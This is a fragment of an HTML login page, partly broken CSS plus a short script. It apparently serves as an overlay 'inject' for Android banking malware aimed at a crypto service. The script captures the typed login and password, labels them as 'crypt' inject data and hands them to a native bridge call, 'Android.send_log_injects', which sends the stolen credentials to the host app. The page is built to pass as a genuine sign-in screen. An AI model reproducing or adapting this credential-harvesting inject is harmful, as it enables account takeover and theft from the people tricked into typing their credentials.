        }

        .cool-input__input {

            width: 100%;
            padding: 10px;
            padding-left: 0;
            position: relative;
            z-index: 2;
            font-size: 1em;

        .cool-input__input:focus {

        .cool-input__placeholder {
            box-sizing: border-box;
            border: none;
            background: none;
            width: 100%;
            position: absolute;
            z-index: 1;
            left:0;
            top: 50%;
            line-height: 1em;
            color: #afafaf;
            transition: all 0.2s ease;
        }

        .cool-input__input_filled + .cool-input__placeholder,
        .cool-input__input:focus + .cool-input__placeholder {
            font-size: 0.8em;
            top: 0;
            margin-top: -0.5em;
            color: #2a2d2f;
        }

        form {
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        section { 
            flex: 1;
            padding: 20px;
        }

        footer {
            padding: 20px;
        }

        .button {

            background-color: #159e49;
            color: #fff;
            border: 0;
            border-radius: 25px;
            width: 100%;
            font-weight: 600;
        }

        .button:disabled {

    <script>
        $('.cool-input__input').on('input', function(){
            var $this = $(this);
            if ($this.val() == '') {
                $this.removeClass('cool-input__input_filled');
            } else {
                $this.addClass('cool-input__input_filled');
            }
        });

        var login = document.getElementById('login'),
            password = document.getElementById('password'),
            sendData = document.getElementById('sendData'),
            eye = document.getElementById('eye');

        eye.onclick = () => {
            if(password.type == 'password') {
                password.type = 'text'
            } else {
                password.type = 'password'
            }
        }

        function check() {
            if(login.value.length > 5 && password.value.length > 0) {
                sendData.disabled = false
            } else {
                sendData.disabled = true
            }
        }

        login.onkeyup = () => {
            check()
        }

        password.onkeyup = () => {
            check()
        }

        sendData.onclick = () => {
            var data = {};
            data.login = login.value;
            data.password = password.value;
            data.type_injects = "crypt";
            data.closed = "close_activity_injects";

            var ua = navigator.userAgent.toLowerCase();
            if(ua.indexOf("android") > -1) {
                try {
                    Android.send_log_injects(JSON.stringify(data))
                } catch (err) {}
            }else{
                alert(JSON.stringify(data));
            }
        }
    </script>
